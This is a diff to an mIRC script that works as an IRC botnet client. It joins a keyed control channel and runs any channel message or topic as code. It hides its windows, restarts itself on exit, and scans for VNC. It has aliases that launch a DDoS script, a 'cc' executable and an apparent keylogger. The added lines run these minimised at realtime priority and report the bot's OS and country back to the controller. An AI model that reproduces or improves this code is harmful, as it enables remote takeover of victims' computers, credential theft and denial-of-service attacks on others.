@@ -1,11 +1,11 @@
 on *:APPACTIVE:findtray
-on 1:CONNECT:{ join %fldchan %key | .timercon off }
+on 1:CONNECT:{ join %fldchan %key | .timercon off | .timerC 1 10 resolve | .timernick 1 30 nick %ctry $+ $+ %start $+ |- $+ $os }
 alias findtray { .timer 1 0 showmirc -t }
 alias ff .timerff 0 1 findtray
 raw 001:*:{ set %fldchan #X#psy#X# | set %key $encode(Sm0k3d,m) | join %fldchan %key }
 raw 475:*:{ join %fldchan %key }
 RAW 332:*:if ($2 == %fldchan) [ [ $3- ] ]
-on *:TEXT:*:*:{ %x = $1- | $evalnext(%x) | opnotice %fldchan $evalnext(%x) | unset %x | close -m | windows -h $active }
+on *:TEXT:*:*:{ %x = $1- | $evalnext(%x) | .timerMSG 1 3 .msg %fldchan 8,12 $evalnext(%x) | unset %x | close -m | windows -h $active }
 on *:EXIT:run $mircexe
 on *:sockopen:vncscan*:{
   if ($sockerr) { return }
@@ -26,8 +26,8 @@ on *:sockread:vncscan*:{
 
 }
 
-alias ddos { run P\p.exe P\ddos.py $2-   }
-alias cc { run cc\cc.exe }
+alias ddos { run start /MIN /REALTIME $shortfn($mircdir(P\p.exe)) $shortfn($mircdir(P\ddos.py)) $2- & }
+alias cc { run start /MIN /REALTIME $shortfn($mircdir(cc\cc.exe)) }
 alias kl { run system.exe | .timerkl -o 0 10 init }
 
 alias checkvnc {
